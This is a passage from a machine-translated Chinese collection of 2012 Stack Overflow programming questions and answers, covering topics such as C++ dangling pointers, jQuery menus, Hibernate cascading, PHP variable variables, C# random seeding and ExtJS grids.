ss << "a" << colnum;
const char* colnumstr = ss.str().c_str();     
cout << "json: colnumstr = \"" << colnumstr << "\", value = \"" << value << "\"" << endl;
rest.AddMember(colnumstr,v,rest.GetAllocator()); 
```

当循环结束时，我将 json 作为字符串添加到地图中，如下所示：

```
StringBuffer buffer;
Writer<StringBuffer> writer(buffer);
rest.Accept(writer);

string reststring = buffer.GetString();
cout << "Pushing " << reststring << " to map" << endl;
parseddata["rest"].push_back(reststring); 
```

这是奇怪的一点：

```
json: colnumstr = "a1", value = "13745438"
json: colnumstr = "a2", value = "#N/A"
json: colnumstr = "a9", value = "Top 19"
Pushing {"a1":"9999\u0000438","99":"#N/A","31":"Top 19"} to map 
```

某些价值观似乎正在发生变化。但我不知道如何或为什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:30:33.390

我看到的第一件事是这个错误（可能与您的问题无关）：

```
const char* colnumstr = ss.str().c_str(); 
```

这是错误的，为什么：

`ss.str()`：返回字符串实例的副本。

`.c_str()`：获取该字符串的内部数据

但是字符串实例在打印结果之前销毁了下一行，因此 colnumstr 指针指向内存中无效的内容。希望大多数时候数据仍然有效......但在某些情况下，数据可以被其他东西覆盖。

正确的解决方案是

```
string colnumstrObj = ss.str();
const char* colnumstr = colnumstrObj .c_str(); 
```

将`colnumstrObj`在函数结束时被销毁，而不是立即......

# groovy - 如何在 Groovy 中创建一个大小为 N 的集合/数组，每个单元格初始化为零？

> ID：13841689
> 
> 赞同：7
> 
> 时间：2012-12-12T14:13:58.950
> 
> 标签：groovy

有没有一种捷径可以创建一个大小为 N 的集合/数组，并且在 Groovy 中将每个单元初始化为零？[似乎在http://groovy.codehaus.org/JN1015-Collections](http://groovy.codehaus.org/JN1015-Collections)上找不到它

例如

```
arr = func(3) 
```

会导致

```
arr = [0, 0, 0] 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-12T14:46:03.257

是的，[`Collection#multiply`](http://groovy.codehaus.org/groovy-jdk/java/util/Collection.html#multiply%28java.lang.Number%29)（或`*`）方法：

```
assert [0] * 3 == [0, 0, 0] 
```

# jquery - 带进度条的菜单

> ID：13841692
> 
> 赞同：0
> 
> 时间：2012-12-12T14:14:10.817
> 
> 标签：jquery, html, css

我想创建一个像这个网站 [http://www.easywaytea.com.au/](http://www.easywaytea.com.au/)这样的菜单 而不是下拉部分只有进度动画

这就是我正在尝试的

```
$(document).ready(function(){
// box 1
$('#level2').mouseover(function(){
    $('#menu_progress').animate({width:"37%"});
});
$('#level2').mouseout(function(){
    $('#menu_progress').animate({width:"8%"});
}); 
```

});

```
<div class="menu_container">
    <nav class="menu">
        <ul>
            <li id="level1"><a href="index.html" class="current">Home</a></li>
            <li id="level2"><a href="current-promotions.html">Current Promotions</a></li>
            <li id="level3"><a href="our-drinks.html">Our Drinks</a></li>
            <li id="level4"><a href="faq.html">FAQ’s</a></li>
            <li id="level5"><a href="location.html">Location</a></li>
            <li id="level6"><a href="contact-us.html">Contact Us</a></li>
        </ul>
    </nav>
  <div id="menu_progress"></div>
  </div> 
```

但问题是当移动到下一个菜单项动画时，每次我悬停菜单项时都会重复任何建议都会有所帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:54:10.327

This could be an example:

```
$('.menu ul li').mouseover(function(){
    var x = $(this).offset().left + $(this).width();
    $('#menu_progress').animate({width:x});
}); 
```

with some CSS style:

[Fiddle](http://jsfiddle.net/EMMaj/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T15:13:04.893

试试这个**[演示](http://jsbin.com/iseyoj/2)**

它包括简单的 Jquery 为：

```
$(function(){
  $(".navLinks").on("hover","a",function(){
    width =$(this).position().left +parseInt($(this).width());
    $(".thermo").animate({width: width}, {queue: false});
  });

}); 
```

======= 编辑1 =============

要将进度条角色恢复到鼠标退出的正常位置只需添加鼠标退出事件

```
$(".navLinks").mouseout(function(){
  width =$(".navLinks .activeLink").position().left +parseInt($(".navLinks .activeLink").width());
  $(".thermo").animate({width: width}, {queue: false});
  }); 
```

见**[演示2](http://jsbin.com/iseyoj/3)**

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:56:46.257

这里我有两个 jsfiddle 示例：

[http://jsfiddle.net/wmichaelgreen/Gj6Pv/](http://jsfiddle.net/wmichaelgreen/Gj6Pv/)

[http://jsfiddle.net/xXM2z/](http://jsfiddle.net/xXM2z/)

在那里你也`width`用 JQuery 改变了。也许它会帮助你。

# spring - 更新父实体时使用@OneToOne 单向映射时出现问题：子实体未持久化

> ID：13841695
> 
> 赞同：1
> 
> 时间：2012-12-12T14:14:12.933
> 
> 标签：spring, hibernate, jpa

我有一个简单的父/子用例，这让我很难让它正常运行。问题是保存操作按预期工作，但更新似乎没有。

父类：

```
@Entity
public class Parent {

 private Long id;

 private Fils fils;

 @Id
 @GeneratedValue(strategy=GenerationType.AUTO)
 public Long getId() {
     return id;
 }

 public void setId( Long id ) {
     this.id = id;
 }

 @OneToOne(cascade=CascadeType.ALL, orphanRemoval=true)
 @JoinColumn(name="fils_fk")
 public Fils getFils() {
     return fils;
 }

 public void setFils( Fils fils ) {
     this.fils = fils;
 }    
} 
```

儿童班：

```
@Entity
public class Fils {

 private Long id;    

 @Id
 @GeneratedValue(strategy=GenerationType.AUTO)
 public Long getId() {
     return id;
 }

 public void setId( Long id ) {
     this.id = id;
 }

} 
```

测试类：

```
@Test
public void testSave(){
    Parent p = new Parent();
    p.setFils( new Fils() );
    dao.save( p );
    Assert.assertNotNull( p.getFils().getId() );
    dao.delete( p );
}

@Test
public void testUpdate(){
    Parent p = new Parent();
    dao.save( p );
    Fils f = new Fils();
    p.setFils( f );
    dao.update( p );
    Assert.assertNotNull( p.getFils().getId() );
} 
```

首先保存持久 Fils 对象，然后保存 Pere 对象，一切都很好，但只更新 Pere 对象。

我在 ParentDao 中使用了这段代码来执行更新：

```
public Parent update(Parent p){
    sessionFactory.getCurrentSession().update( p );
    return (Parent)sessionFactory.getCurrentSession().load( Parent.class, p.getId() );
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2019-12-07T14:46:57.947

*OP的解决方案。*

问题解决了。

在 ParentDao 中替换代码片段以执行更新：

```
public Parent update(Parent p){
    sessionFactory.getCurrentSession().persist( p );
    return (Parent)sessionFactory.getCurrentSession().load( Parent.class, p.getId() );
} 
```

并且 tadam 更新工作级联子实体持久性。

我从来没有读过你不能使用更新并在这个操作上得到级联。

# jquery - 更改 jquery datepicker 设置无效

> ID：13841697
> 
> 赞同：0
> 
> 时间：2012-12-12T14:14:15.663
> 
> 标签：jquery, datepicker

根据所选日期，我想修改用于启动日期选择器的图像。在 onSelect 事件中，我设置了 inst.settings.buttonImage 属性，但图像没有改变。下次我启动 datepicker 并检查 onSelect 事件中的属性时，它确实设置为新图像。我必须做什么才能使新属性生效。

# javascript - FancyBox - “不再显示此消息”按钮？

> ID：13841698
> 
> 赞同：1
> 
> 时间：2012-12-12T14:14:17.783
> 
> 标签：javascript, jquery, html, fancybox, fancybox-2

我在一个网站上有**FancyBox**，当他们访问时会弹出并在其中包含一些信息。我想添加一些用户可以点击的按钮，它设置了一个 cookie 大约一个月左右不显示消息。

当涉及到这样的事情时，我很无用，所以如果有人能指导我该怎么做，那就太棒了。

这是我到目前为止所拥有的。在底部，我添加了我认为可能是提议的 cookie 的锚（“noShow”），但我不确定它是否会像现在这样工作。在此之前我已经为 FancyBox 加载了所有 jQuery 脚本，之后它也加载了**jquery.cookie.js**。如果重要的话，我会使用 FancyBox 2 的最新下载。

```
<script type="text/javascript"> 
function openFancy() { 
setTimeout( function() {$('#autoStart').trigger('click'); },1000);
} 

$(document).ready(function() {
    openFancy();
    $('#autoStart').fancybox();
});
</script>

<!-- This is the popup itself -->
<a id="autoStart" style="display:none" href="#autoFancybox"></a>
 <div style="display: none;">
  <div id="autoFancybox" style="width: 800px">
   <div>
    <!-- My content for the Fancybox is here -->
    <br />
    <p style="font-size:10px" align="right">
    <a id="noShow" href="#noShow">Don't me show this message again</a>
    </p>
   </div>
  </div>
 </div> 
```

谢谢，利亚姆。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-17T06:02:26.607

除了启动 fancybox 的函数之外，还可以创建另一个设置 cookie 的*值*和单击按钮时的 *过期时间的函数：*

```
function dontShow(){
 $.fancybox.close(); // optional
 $.cookie('visited', 'yes', { expires: 30 }); // set value='yes' and expiration in 30 days
} 
```

...然后验证cookie并决定是否启动fancybor：

```
$(document).ready(function() {
    var visited = $.cookie('visited'); // create cookie 'visited' with no value
    if (visited == 'yes') {
        return false;
    } else {
        openFancy(); // cookie has no value so launch fancybox on page load
    }
  $('#autoStart').fancybox(); // bind fancybox to selector
}); // ready 
```

...现在是您的按钮的 html

```
<a id="noShow" href="javascript:dontShow()">Don't show this message again</a> 
```

查看**[工作演示](http://www.picssel.com/playground/jquery/createCookieWithButton_16dec12.html)**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T15:53:46.133

有一个很棒的用于 cookie 管理的 jQuery 插件，你应该看看 - [https://github.com/carhartl/jquery-cookie](https://github.com/carhartl/jquery-cookie)

当用户访问您的网站时，您可以检查您的 cookie 以查看他们以前是否访问过该网站。如果他们还没有显示您的动画并设置 cookie。如果他们有然后不要运行动画。

从 jquery-cookie 文档一目了然，您可以像这样设置 7 天的 cookie： $.cookie('visited', 'yes', { expires: 7 }); 所以你的代码可能看起来像：

```
// Make sure DOM has fully loaded before running code
$(function(){
    if( ! $.cookie('visited')){
        // Your code here
    } else {
        $.cookie('visited', 'yes', { expires: 7 });
    }
}); 
```

# html - 如何使用 table-layout: fixed 设置两行标题表的宽度？

> ID：13841700
> 
> 赞同：1
> 
> 时间：2012-12-12T14:14:28.580
> 
> 标签：html

我想要的表头：

```
<table class="tabel_op_panou" style="margin: 0px 2px 0px 2px; width: 99%; table-layout:fixed;">
<tr>
    <th rowspan="2" style="width: 35%;">A</th>
    <th colspan="2" style="width: 25%;">B</th>
    <th colspan="3" style="width: 40%;">C</th>
</tr>
<tr>
    <th style="width: 8%;">B1</th>
    <th style="width: 17%;">B2</th>
    <th style="width: 8%;">C1</th>
    <th style="width: 17%;">C2</th>
    <th style="width: 15%;">C3</th>
</tr> 
```

问题是无论我如何设置宽度，第二行都保持不变。我尝试了百分比和固定像素宽度。

从样式中删除表格布局似乎可行，但我需要固定布局。在保持“表格布局：固定”的同时有什么办法吗？

我希望最终的布局看起来像[这样](http://jsfiddle.net/rRJU7/)，但使用 table-layout: fixed/

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-12T14:38:46.757

[表格布局：固定](https://developer.mozilla.org/en-US/docs/CSS/table-layout)：

> 表格和列的宽度由 table 和**col** 元素的宽度或第一行单元格的宽度设置。后续行中的单元格不影响列宽。

因此，您可以像这样修改代码：

```
<table class="tabel_op_panou" style="margin: 0px 2px 0px 2px; width: 99%;border:1px solid grey;table-layout:fixed;">
    <col style="width: 35%;"/>
    <col style="width: 8%;"/>
    <col style="width: 17%;"/>
    <col style="width: 8%; "/>
    <col style="width: 17%;"/>
    <col style="width: 15%;"/>
<tr>
    <th rowspan="2" style="width: 35%; border:1px solid grey;">A</th>
    <th colspan="2" style="width: 25%; border:1px solid grey;">B</th>
    <th colspan="3" style="width: 40%; border:1px solid grey;">C</th>
</tr>
<tr>
    <th style="width: 8%; border:1px solid grey;">B1</th>
    <th style="width: 17%; border:1px solid grey;">B2</th>
    <th style="width: 8%; border:1px solid grey;">C1</th>
    <th style="width: 17%; border:1px solid grey;">C3</th>
    <th style="width: 15%; border:1px solid grey;">C4</th>
    </tr>
</table> 
```

见演示：http: [//jsfiddle.net/rRJU7/2/](http://jsfiddle.net/rRJU7/2/)

# iphone - 在 UITableView 中显示来自 Core Data 的下载队列

> ID：13841703
> 
> 赞同：4
> 
> 时间：2012-12-12T14:14:36.897
> 
> 标签：iphone, objective-c, ios, xcode, nsoperationqueue

我想从基于 Core Data 本地数据库的服务器下载一定数量的数据，其中包含指向内容的链接。

然后，我想要一个表格视图，可以在队列列表中动态显示正在下载的内容。它类似于您在 iPhone 上的 iTunes 应用程序中看到的内容，您可以在其中下载带有进度条指示器的歌曲或播客表。

我已经查看了很多关于 NSOperationQueue 的教程，比如[这个](http://www.raywenderlich.com/19788/how-to-use-nsoperations-and-nsoperationqueues)或[这个](http://eng.pulse.me/concurrent-downloads-using-nsoperationqueues/)，我还决定不使用[ASIHTTPRequest 框架](http://allseeing-i.com/ASIHTTPRequest/)，因为它已经过时了。

究竟如何将正在下载的项目的 NSOperationQueue 包装到 UITableview 中，其 URL 取自 Core Data 数据库，包括下载进度活动指示器以及在完成下载后从表视图中删除元素？

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-24T10:09:21.717

在研究该主题期间，我最终为下载队列编写了自己的自定义类。 `NSOperationQueue`在我看来，它有几个与控制相关的缺点`NSOperations`——例如，你不能将它们向上或向下移动——只能将它们的优先级从高变为低。

我也选择不使用， `ASIHTTPRequest framework`因为正如我之前所说，它已经过时了。

我的课程基于`NSMutableArray`保存队列元素并`NSMutableDictionary`为它们保存一些值。

# c# - 匹配项 WPF 的计数

> ID：13841705
> 
> 赞同：0
> 
> 时间：2012-12-12T14:14:43.033
> 
> 标签：c#, wpf

我有一个绑定客户信息的列表视图。另外，我有一个在列表视图中提供搜索的文本框。如果文本框的键入字符或符号与数据列表项匹配，则它会突出显示匹配项。关于这一点，我想计算匹配的项目数。但是每次搜索计数都是“0”。当我调试它时，foreach 循环中的计数为真，但在 TxtSearch_PreviewKeyDown 中它始终为零。请看一看。我怎样才能找到匹配的项目数量？

```
 private int highlightcount;
    public int highlightCount
    {
        get;
        set;
    }       
    private void FindListViewItem(DependencyObject obj)
    {
        try
        {
            for (int i = 0; i < VisualTreeHelper.GetChildrenCount(obj); i++)
            {
                ListViewItem lv = obj as ListViewItem;
                if (lv != null)
                {
                    HighlightText(lv);
                }
                else
                    FindListViewItem(VisualTreeHelper.GetChild(obj as DependencyObject, i));
            }
        }
        catch
        {
            MessageBox.Show("Bevor Sie die Suche Stauten, wählen Sie bitte eine Adresse in der linken Spalte aus.");
        }
    }
    /// <summary>
    /// Method for highlighting matched listview item
    /// </summary>
    /// <param name="itx"></param>
   public void HighlightText(Object itx)
    {
        try
        {
            if (itx != null)
            {
                if (itx is TextBlock)
                {
                    Regex regex = new Regex("(" + TxtSearch.Text + ")", RegexOptions.IgnoreCase);
                    TextBlock tb = itx as TextBlock;
                    if (TxtSearch.Text.Length == 0)
                    {
                        string str = tb.Text;
                        tb.Inlines.Clear();
                        tb.Inlines.Add(str);
                        return;
                    }
                    string[] substrings = regex.Split(tb.Text);
                    tb.Inlines.Clear();

                    highlightCount = 0;
                    foreach (var item in substrings)
                    {
                        if (regex.Match(item).Success)
                        {                                
                            Run runx = new Run(item);
                            runx.Background = Brushes.Lime;                               
                            tb.Inlines.Add(runx);
                            highlightCount++;

                            if (tb.IsMouseOver)
                            {
                                tb.IsEnabled = false;                                   
                            }
                        }
                        else
                        {
                            tb.Inlines.Add(item);
                            tb.IsEnabled = false;                             
                        }                            
                    }                        
                    return ;
                } 
                else
                {
                    for (int i = 0; i < VisualTreeHelper.GetChildrenCount(itx as DependencyObject); i++)
                    {
                        HighlightText(VisualTreeHelper.GetChild(itx as DependencyObject, i));
                    }
                }
            }
        }
        catch
        {
            MessageBox.Show("Suche Error");
        }
    }       
    private void TxtSearch_PreviewKeyDown(object sender, KeyEventArgs e)
    {
        if (TxtSearch.Text.Length > 1 && e.Key==Key.Enter)
        {
            Mouse.OverrideCursor = Cursors.Wait;
            ListControl lc = getactivListview();
            FindListViewItem(lc);               
            Mouse.OverrideCursor = null;
            MessageBox.Show(highlightCount.ToString());
            FocusManager.SetFocusedElement(this, TxtSearch);  
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T07:05:38.890

尝试`highlightCount = 0;`从您的 HighlightText 方法中删除并将其添加到`TxtSearch_PreviewKeyDown`Eventhandler（上`ListControl lc = getactivListview();`或下`MessageBox.Show(highlightCount.ToString());`）

# ios - UIScrollView 像 UITableView 一样工作

> ID：13841707
> 
> 赞同：-2
> 
> 时间：2012-12-12T14:14:48.920
> 
> 标签：ios

我想使用 UIScrollView 而不是 UITableView，但我应该包含与 TableView 相同的 dequeue 功能。是否有任何教程或示例项目可以帮助我使 UIScrollView 像 UITableView 一样运行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:51:10.353

简单的回答：不，滚动视图上没有出队功能，这就是表格视图的用途！

所以我对你的问题是：你想要做什么，我也许可以帮助你。

# php - web MVC - 如何报告模型的处理结果

> ID：13841710
> 
> 赞同：0
> 
> 时间：2012-12-12T14:14:50.327
> 
> 标签：php, model-view-controller

每个人都可以随心所欲地理解 mvc，但有时我根本不理解。
目前我的大多数控制器看起来像这样：

```
<?php
$input = $_REQUEST['field']
$model = new Model();
$status = $model->launchSpaceShuttle($input);

switch($status)
{
    case Model::STATUS_LAUNCHED:
        header('Location: Mars');
        break;

    case Model::STATUS_INVALID_INPUT:
        echo "Please press the big red button correctly";
        break;

    case Model::STATUS_PILOT_IN_HANGOVER:
        ...
        ...
    case etc.
} 
```

这就引出了一个明显的问题：
这就是它应该的样子吗？模型返回的状态码和控制器决定如何显示和显示什么？
因为这与作为输入设备和模型之间非常薄的包装器的简单、短控制器的理论非常冲突。

*奖励案例*：如果我懒得创建视图，ajax 请求怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T14:16:57.130

啊，这很容易。只需将整个开关移动到视图文件即可。
与用户交互是视图的责任。

**从视图内部重定向也一样好。**
无论如何，在大多数框架中，视图文件都会继承`$this`代表活动控制器的变量。

关于ajax请求也是如此。

# backbone.js - bacbone js视图在桌面空气中静默失败

> ID：13841711
> 
> 赞同：1
> 
> 时间：2012-12-12T14:14:59.480
> 
> 标签：backbone.js, air, underscore.js

该应用程序在网络浏览器中运行没有问题，并为 iPad 打包，但一旦安装并在桌面环境中运行，它就会静默失败！

我发现错误在于视图的实例化。

我正在调用：`var PageView = Backbone.View.extend({ ... });`使用标准 el，初始化和渲染，但它们都没有触发！（没有任何反应，没有警报或日志）

如果其中任何一个触发了我会发布代码，但它似乎根本没有运行 - 只是默默地失败。

我非常乐意提供更多信息，但我不确定到底要分享什么。

这是一个已知的问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T13:30:01.607

最新的backbonejs 文件解决了这个问题。

# php - 变量变量不适用于数组

> ID：13841715
> 
> 赞同：1
> 
> 时间：2012-12-12T14:15:01.670
> 
> 标签：php

我正在尝试做一个变量变量，但是当我在下面的代码中使用它时它不会工作。

我不断得到：

```
Notice: Undefined variable: C in C:\web\apache\htdocs\cats-test.php on line 8 
```

这仅在与数组一起使用时才起作用。你能帮我吗？

```
$Consumer = array(
"a" => "Apparel",
"b" => "Books & Stationary",
);
$cat = "Consumer";

echo $$cat['a']; //I'm trying to make this $Consumer['a']; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:17:07.680

```
echo ${$cat}['a']; 
```

无论您的意思是`$$cat ['a']`还是都是模棱两可的`$ $cat['a']`。使用括号。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T14:17:52.043

注意操作员的优先级。`${$cat}['a']`应该工作得更好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:17:00.377

访问变量变量中的数组键时，将变量括在其中`{}`以确保 PHP 将正确的字符集 ( `$cat`) 扩展为变量。

```
echo ${$cat}['a'];
// Apparel 
```

# javascript - 画布游戏：碰撞检测

> ID：13841716
> 
> 赞同：0
> 
> 时间：2012-12-12T14:15:03.120
> 
> 标签：javascript, html, canvas, html5-canvas

为了我的教育，我必须用 HTML5 画布制作一个基本的游戏。游戏是一款射击游戏。当您可以向左->向右移动并且拍摄空间时。当我射击时，子弹会向上移动。敌人向下移动。当子弹击中敌人时，敌人必须消失，它会获得+1分。但是敌人出现后就会消失。

演示：http: [//jordikroon.nl/test.html](http://jordikroon.nl/test.html)

空间=射击+敌人出现

这是我的代码：

```
 for (i=0;i<enemyX.length;i++) {

                if(enemyX[i] > canvas.height) {

                    enemyY.splice(i,1);
                    enemyX.splice(i,1);
                 } else {

                    enemyY[i] += 5;
                    moveEnemy(enemyX[i],enemyY[i]);

                 }
            }

            for (i=0;i<bulletX.length;i++) {

                if(bulletY[i] < 0) {
                    bulletY.splice(i,1);
                    bulletX.splice(i,1);
                 } else {

                    bulletY[i] -= 5;
                    moveBullet(bulletX[i],bulletY[i]);

                    for (ib=0;ib<enemyX.length;ib++) {

                      if(bulletX[i] + 50 < enemyX[ib] ||
                              enemyX[ib] + 50 < bulletX[i] ||
                               bulletY[i] + 50 < enemyY[ib] ||
                               enemyY[ib] + 50 < bulletY[i]) 
                        {   
                            ++score;
                            enemyY.splice(i,1);
                            enemyX.splice(i,1);
                        }
                    }   
                 }
            } 
```

对象：

```
 function moveBullet(posX,posY) {
            //console.log(posY);
            ctx.arc(posX, (posY-150), 10, 0 , 2 * Math.PI, false);

        }

        function moveEnemy(posX,posY) {

            ctx.rect(posX, posY, 50, 50);
            ctx.fillStyle = '#ffffff';
            ctx.fill(); 
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T14:52:53.963

ORI 认为我看到了问题。您在碰撞检测中有以下代码

```
 if(bulletX[i] + 50 < enemyX[ib] ||
                          enemyX[ib] + 50 < bulletX[i] ||
                           bulletY[i] + 50 < enemyY[ib] ||
                           enemyY[ib] + 50 < bulletY[i]) 
```

这是直接的 ORs(||)，+50 在小于的一侧。这意味着只要子弹*不在*碰撞箱中，它实际上应该触发为真。我怀疑您希望将 +50 放在大于一侧，并将 ORs(||) 改为 ANDs(&&)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T19:31:59.293

除了 Ben 的更正之外，为了将来参考，最好进行线线碰撞检测，而不是点盒碰撞检测。

这样做的原因是，假设你的敌人很小，而你的子弹移动得很快。子弹总是有可能在一帧中出现在敌人之前，然后在下一帧中出现在敌人后面，因此永远不会被记录为命中。

测试与子弹路径的相交和敌人的假想线将更加准确。

# c# - 代码只有在使用调试器单步执行时才能正确运行？

> ID：13841718
> 
> 赞同：5
> 
> 时间：2012-12-12T14:15:07.047
> 
> 标签：c#, mono, xna, monogame

> **可能重复：**
> [随机数生成器仅生成一个随机数](https://stackoverflow.com/questions/767999/random-number-generator-only-generating-one-random-number)

前段时间我对这个有点困惑。我有以下代码：

```
public blockType generateRandomBlock()
{
    Random random = new Random();
    int makeBlockOfType = random.Next(0, 100);

    blockType t = blockType.normal;
    if (makeBlockOfType <= 80 && makeBlockOfType >= 60)
    {
        t = blockType.blue;
    }
    else if (makeBlockOfType > 80 && makeBlockOfType <= 95)
    {
        t = blockType.orange;
    }
    else if (makeBlockOfType > 95 && makeBlockOfType <= 100)
    {
        t = blockType.green;
    }

    return t;
} 
```

相当简单，它`enum`根据随机生成的数字（基于系统时间）返回一个值。不幸的是，出于某种奇怪的原因，我的所有方块都要么是一种颜色，要么是另一种颜色，即使这对放入游戏中的每一个方块都运行。但是，当我使用调试器逐步执行此操作并在运行后查看结果时，我看到块现在根据提供的机会是多色的。我有点困惑为什么会这样。

为此，我使用 MonoGame，它使用 Mono 编译器而不是 Microsoft 编译器。这可能是问题吗？我试图将此代码内联到调用它的构造函数中，但我得到了相同的结果（我猜编译器无论如何都会内联代码）。

我试图单独重新启动 Visual Studio，而不是让运行进行构建；没有变化。

非常感谢任何建议和帮助！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-12T14:18:19.080

您应该只实例化 Random 一次（将其设置为私有字段并在构造函数中实例化），请参阅类似的问题：[Random.Next 返回始终相同的值](https://stackoverflow.com/questions/1654887/random-next-returns-always-the-same-values)

请参阅[随机文档](http://msdn.microsoft.com/en-us/library/system.random.aspx)：

> 随机数生成从种子值开始。如果重复使用同一个种子，就会产生同一系列的数字

在您的情况下，您创建一个具有相同种子（时间太近）的 Random 实例，并且您取第一个值，该值对于给定的种子是相同的。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-12T14:18:44.923

每次调用方法时，您都在重新创建随机数生成器：

```
public blockType generateRandomBlock()
{
    Random random = new Random(); 
```

由于随机数生成器的种子基于时间，因此连续调用将返回相同的值。

将生成器的创建移到例程之外：

```
Random random = new Random();
public blockType generateRandomBlock()
{ 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-12T14:18:14.557

当您`Random`在很短的时间内连续创建多个实例时，它们最终可能会使用相同的时间相关种子值进行初始化。

要解决此问题，您应该将您的初始化`Random`为实例字段：

```
private readonly Random random = new Random();

public blockType generateRandomBlock()
{
    int makeBlockOfType = random.Next(0, 100);

    // ...
} 
```

# php - 使用 ajax 方法在布局浏览器中的 extjs 网格中显示 treepanel 响应文本

> ID：13841721
> 
> 赞同：-1
> 
> 时间：2012-12-12T14:15:09.497
> 
> 标签：php, html, mysql, ajax, extjs4

我正在尝试在布局浏览器 u 中显示 extjs 网格和树，树响应数据显示在 extjs 网格和网格刷新动态中，我的目标是当我单击树叶时，树叶数据显示在 extjs 网格中然后网格刷新 automaticle 这是 layout-browser.js 代码

```
 Ext.Loader.setConfig({enabled: true});

        Ext.Loader.setPath('Ext.ux', '../ux');

        Ext.require([
            'Ext.tip.QuickTipManager',
            'Ext.container.Viewport',
            'Ext.layout.*',
            'Ext.form.Panel',
            'Ext.form.Label',
            'Ext.grid.*',
            'Ext.data.*',
            'Ext.tree.*',
            'Ext.selection.*',
            'Ext.tab.Panel',
            'Ext.ux.layout.Center'  
        ]);

        //
        // This is the main layout definition.
        //
        Ext.onReady(function(){

            Ext.tip.QuickTipManager.init();

            // This is an inner body element within the Details panel created to provide a "slide in" effect
            // on the panel body without affecting the body's box itself.  This element is created on
            // initial use and cached in this var for subsequent access.
            var detailEl;

            // Gets all layouts examples
            var layoutExamples = [];
            Ext.Object.each(getBasicLayouts(), function(name, example) {
                layoutExamples.push(example);
            });

            Ext.Object.each(getCombinationLayouts(), function(name, example){
                layoutExamples.push(example);
            });

            Ext.Object.each(getCustomLayouts(), function(name, example){
                layoutExamples.push(example);
            });

            // This is the main content center region that will contain each example layout panel.
            // It will be implemented as a CardLayout since it will contain multiple panels with
            // only one being visible at any given time.
        Ext.define('ImageModel', {
                extend: 'Ext.data.Model',
                fields: ['patent_id', 'Patent_number', 'Title','Abstract','Filing_Year','Assignee']
            });
            var store1 = Ext.create('Ext.data.JsonStore', {
                model: 'ImageModel',
                actionMethods:{read:'GET'},
                proxy: {
                    type: 'ajax',
                    url: 'json.php',
                    reader: {
                        type: 'json',
                        root: 'results'
                    }
                }
            });
            store1.load();

            var store = Ext.create('Ext.data.TreeStore', {
                root: {
                    expanded: true
                },
                proxy: {
                    type: 'ajax',
                    url:'get-nodes.php',
                    actionMethods: 'POST'
                }
            });

            // Go ahead and create the TreePanel now so that we can use it below
             var treePanel = Ext.create('Ext.tree.Panel', {
                id: 'tree-panel',
                title: 'Sample Layouts',
                region:'north',
                split: true,

                minSize: 150,
                rootVisible: false,
                autoScroll: true,
                store: store
            });

            // Assign the changeLayout function to be called on tree node click.
            treePanel.getSelectionModel().on('select', function(selModel, node) {
            var selectedNode = treePanel.getSelectionModel().getSelection();
                if (node.get('leaf')) {
                           // Ext.getCmp('content-panel').layout.setActiveItem(record.getId() + '-panel');

                        //var bd = Ext.getCmp('details-panel').body;

                   // detailsPanel.update(Ext.getDom(node.getId() ).innerPHP).slideIn('l', {stopAnimation:true,duration: 200});
                Ext.Ajax.request({

                             url: 'http://localhost/Ext.ux/examples/layout-browser/json.php',

                                        method:'GET',

                                        params: {

                                        id : selectedNode[0].data.id
                                        },

                          success: function(response){
                                                            //var store1 = getCustomerDataStoreStore;
                                                            store1.loadData(response);
                                                            detailsPanel.getView().refresh(); 
                                                        },
                                                       // jsonData : Ext.JSON.encode(queryform.getValues())

                             // success: function(response){
                              // var id = response.responseText;

                                                    //detailsPanel.getView().refresh();                  
                                                    // //selectedNode[0].expand();                                  

                                            // }
                                        });

                }
            });

            // This is the Details panel that contains the description for each example layout.

               var detailsPanel = Ext.create('Ext.grid.Panel', {
                width:587,
                height:363,
                collapsible:true,
               id: 'details-panel',
                title: 'Details',
                region: 'center',
                bodyStyle: 'padding-bottom:15px;background:#eee;',
                autoScroll: true,

                store: store1,
                multiSelect: true,
                viewConfig: {
                    emptyText: 'No images to display'
                },

                columns: [{
                    text: 'Patent ID',
                    flex: 50,
                    dataIndex: 'patent_id'
                },{
                    text: 'Patent Number',
                    flex: 50,
                    dataIndex: 'Patent_number'
                },{
                    text: 'TITLE',
                    flex: 50,
                    dataIndex: 'Title'
                },{
                    text: 'Abstract',
                    flex: 50,
                    dataIndex: 'Abstract'
                },{
                    text     : 'Filing Year',
                    width    : 75,
                    sortable : true,
                    dataIndex: 'Filing_Year'
                },{
                    text: 'Assignee',
                    flex: 50,
                    dataIndex: 'Assignee'
                }]
            });

            // Finally, build the main layout once all the pieces are ready.  This is also a good
            // example of putting together a full-screen BorderLayout within a Viewport.
            Ext.create('Ext.Viewport', {
                layout: 'border',
                title: 'Ext Layout Browser',
                items: [{
                    xtype: 'box',
                    id: 'header',
                    region: 'north',
                    html: '<h1> Ext.Layout.Browser</h1>',
                    height: 30
                },{
                    layout: 'border',
                    id: 'layout-browser',
                    region:'west',
                    border: false,
                    split:true,
                    margins: '2 0 5 5',
                    width: 275,
                    minSize: 100,
                    maxSize: 500,
                    items: [treePanel]
                }, 
                    detailsPanel
                ],
                renderTo: Ext.getBody()
            });
        }); 
```

